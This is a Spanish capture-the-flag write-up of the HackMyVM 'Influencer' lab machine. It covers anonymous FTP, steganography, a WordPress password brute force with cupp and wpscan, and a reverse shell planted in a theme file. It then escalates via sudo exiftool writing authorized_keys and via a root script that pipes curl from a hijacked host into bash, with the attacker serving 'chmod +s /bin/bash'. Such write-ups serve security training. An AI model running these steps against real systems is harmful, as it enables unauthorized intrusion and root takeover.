---
layout: post
title: Influencer - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: D3b0o \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/influencer/influencer.png#center)

## Reconocimiento

Como de costumbre, lo primero es realizar un análisis de los puertos abiertos usando **nmap**.

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 07:49 EDT
Nmap scan report for 192.168.1.112
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2121/tcp open  ccproxy-ftp
MAC Address: 08:00:27:50:65:12 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
```

### FTP (2121)

Me conecto al servidor ftp con el usuario "anonymous:anonymous" y me descargo todos los archivos.

```
$ ftp 192.168.1.112 2121
Connected to 192.168.1.112.
220 (vsFTPd 3.0.5)
Name (192.168.1.112:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||37151|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0           11113 Jun 09 10:49 facebook.jpg
-rw-r--r--    1 0        0           35427 Jun 09 10:52 github.jpg
-rw-r--r--    1 0        0           88816 Jun 09 10:49 instagram.jpg
-rw-r--r--    1 0        0           27159 Jun 09 10:50 linkedin.jpg
-rw-r--r--    1 0        0              28 Jun 08 20:30 note.txt
-rw-r--r--    1 0        0          124263 Jun 09 10:56 snapchat.jpg
226 Directory send OK.
ftp>
```

Al leer "note.txt" se hace referencia cambiar a una contraseña de **wordpress**, posiblemente porque sea débil.

```
$ cat note.txt
- Change wordpress password
```

También utilizo **stegseek** para buscar archivos ocultos en las imágenes.

```
$ stegseek snapchat.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "backup.txt".
[i] Extracting to "snapchat.jpg.out".
```

Sorpresa!! Hay un archivo con una contraseña de backup.

```
$ cat snapchat.jpg.out
PASSWORD BACKUP
---------------

u3********
```

### Wordpress (80)

Utilizo **gobuster** para listar subdirectorios y ficheros, pero lo único relevante es el directorio wordpress donde se encuentra el blog.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,bak -u http://192.168.1.112
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.112
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html,bak
[+] Timeout:                 10s
===============================================================
2023/08/05 07:52:29 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10671]
/wordpress            (Status: 301) [Size: 318] [--> http://192.168.1.112/wordpress/]
Progress: 6962 / 6369170 (0.11%)^C
[!] Keyboard interrupt detected, terminating.
```

Dentro del blog veo este post en el que se da información acerca de **Luna**.

![img](/imgs/write-ups/hackmyvm/influencer/influencer_1.png#center)

Utilzo **cupp** para crear una lista de posibles contraseñas en base a los datos obtenidos.

```
$ cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: luna
> Surname: shine
> Nickname: 
> Birthdate (DDMMYYYY): 24061997
[...]
```

Y usando **wpscan** puedo obtener la contraseña correcta haciendo un ataque de fuerza bruta con la lista anteriormente generada.

```
$ wpscan --url "http://192.168.1.112/wordpress/" --detection-mode aggressive --api-token j******************************************* -e --plugins-detection aggressive -P luna.txt
[...]
[+] luna
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.1.112/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - luna / l********                                                                                        
Trying luna / luna_199706 Time: 00:00:49 <================                     > (2120 / 4694) 45.16%
```

## Explotación

Una vez dentro del panel de administración > Theme editor. Modifico el archivo index.php del tema que se está usando y añado una "reverse shell".

![img](/imgs/write-ups/hackmyvm/influencer/influencer_2.png#center)

En mi máquina atacante creo un listener y al recargar el blog, obtengo una shell como **www-data**.

```
$ nc -lvp 1234
listening on [any] 1234 ...
192.168.1.112: inverse host lookup failed: Unknown host
connect to [192.168.1.86] from (UNKNOWN) [192.168.1.112] 54752
Linux influencer 5.15.0-73-generic #80-Ubuntu SMP Mon May 15 15:18:26 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 12:15:47 up 29 min,  0 users,  load average: 0.00, 0.02, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ script -qc /bin/bash /dev/null
www-data@influencer:/$ :)
```

## Escalación de privilegios

Una vez dentro, compruebo los puertos abiertos y veo que el puerto 1212 solo está disponible desde localhost.

```
www-data@influencer:/$ ss -tuln
Netid State  Recv-Q Send-Q                     Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0                          127.0.0.53%lo:53        0.0.0.0:*          
udp   UNCONN 0      0                   192.168.1.112%enp0s3:68        0.0.0.0:*          
udp   UNCONN 0      0      [fe80::a00:27ff:fe50:6512]%enp0s3:546          [::]:*          
tcp   LISTEN 0      4096                       127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      128                            127.0.0.1:1212      0.0.0.0:*          
tcp   LISTEN 0      32                               0.0.0.0:2121      0.0.0.0:*          
tcp   LISTEN 0      80                             127.0.0.1:3306      0.0.0.0:*          
tcp   LISTEN 0      511                                    *:80              *:*
```

Casualmente **socat** está instalado, por lo que realizar una redirección de puertos es sencillo.

```
www-data@influencer:/$ which socat
/usr/bin/socat
www-data@influencer:/$ socat TCP-LISTEN:4444,fork TCP:localhost:1212 & 
socat TCP-LISTEN:4444,fork TCP:localhost:1212 &
[1] 13249
```

Al intentar acceder al puerto redirigido me doy cuenta que es un servidor ssh.

![img](/imgs/write-ups/hackmyvm/influencer/influencer_3.png#center)

Ahora lo que hago es probar la contraseña de backup obtenida anteriormente con el usuario **luna**.

```
$ ssh luna@192.168.1.112 -p 4444                        
[...]
Last login: Fri Jun  9 10:12:13 2023
luna@influencer:~$ :)
```

Una vez dentro como **luna**, se puede ver rápidamente que tiene permisos para ejecutar **exiftool** como el usuario **juan**.

```
luna@influencer:~$ sudo -l
Matching Defaults entries for luna on influencer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luna may run the following commands on influencer:
    (juan) NOPASSWD: /usr/bin/exiftool
```

Como se puede ver en **[GTFOBINS](https://gtfobins.github.io/gtfobins/exiftool/#sudo)**, se puede utilizar esta herramienta para leer/escribir archivos. Por lo que para poder obtener acceso como el usuario Juan puedo añadir una clave id_rsa que yo controle a su fichero **authorized_keys**.

Lo primero es crear un par de claves nuevas en el directorio /tmp.

```
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/luna/.ssh/id_rsa): /tmp/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/id_rsa
Your public key has been saved in /tmp/id_rsa.pub
The key fingerprint is:
SHA256:BEoPNqJcpL6lNb5dPyKIWiymhCwF4KuFVtnnDXAabzQ luna@influencer
The key's randomart image is:
+---[RSA 3072]----+
|. oo=o.E         |
|+.o+o=B..        |
|o+ o.o.=.        |
|.oo   +.o        |
|.+o+   .S.       |
|=+* .            |
|=*+..  .         |
|=+ .o.....       |
|+  . .. ...      |
+----[SHA256]-----+
```

Una vez creadas, utilizo **sudo** y **exiftool** para copiarlo a **/home/juan/.ssh/**.

```
luna@influencer:/tmp$ sudo -u juan exiftool -filename=/home/juan/.ssh/authorized_keys id_rsa.pub
Warning: Error removing old file - id_rsa.pub
    1 directories created
    1 image files updated
```

Habiendo copiado la clave, puedo usarla para acceder como Juan.

```
luna@influencer:/tmp$ ssh juan@localhost -i id_rsa -p 1212
[...]
juan@influencer:~$ :)
```

Otra vez compruebo los permisos de **sudo**. Juan puede ejecutar como el usuario **root** el archivo "/home/juan/check.sh".

```
juan@influencer:~$ sudo -l
Matching Defaults entries for juan on influencer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on influencer:
    (root) NOPASSWD: /bin/bash /home/juan/check.sh
```

Leo el archivo **check.sh**.

```
juan@influencer:~$ cat /home/juan/check.sh 
#!/bin/bash

/usr/bin/curl http://server.hmv/98127651 | /bin/bash
```

Como se puede ver, hace una petición a server.hmv y luego ejecuta lo que obtenga.

Tambíen compruebo que tengo permisos para modificar "/etc/hosts" por lo que cambiar la dirección del dominio es sencillo.

```
juan@influencer:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root juan 247 jun  8 23:00 /etc/hosts
```

Hago que **server.hmv** apunte a la dirección de mi máquina atacante.

```
juan@influencer:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 influencer

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

#127.0.0.1 server.hmv
192.168.1.86 server.hmv
```

En mi máquina, creo un archivo llamado igual que en el script "check.sh" y despues inicio un servidor en el puerto 80.

```
kali@kali:~/Desktop$ cat 98127651        
chmod +s /bin/bash
                                                                                                                    
kali@kali:~/Desktop$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Al ejecutar el script como **root** se realiza la petición y se ejecuta el script que he creado por lo que ahora **/bin/bash** tiene permisos SUID y obtener acceso como root es trivial.

```
juan@influencer:~$ sudo /bin/bash /home/juan/check.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    19  100    19    0     0    606      0 --:--:-- --:--:-- --:--:--   612
juan@influencer:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 ene  6  2022 /bin/bash
juan@influencer:~$ bash -p
bash-5.1# whoami
root
bash-5.1# :)
```

Muchas gracias a **D3b0o** por esta máquina.
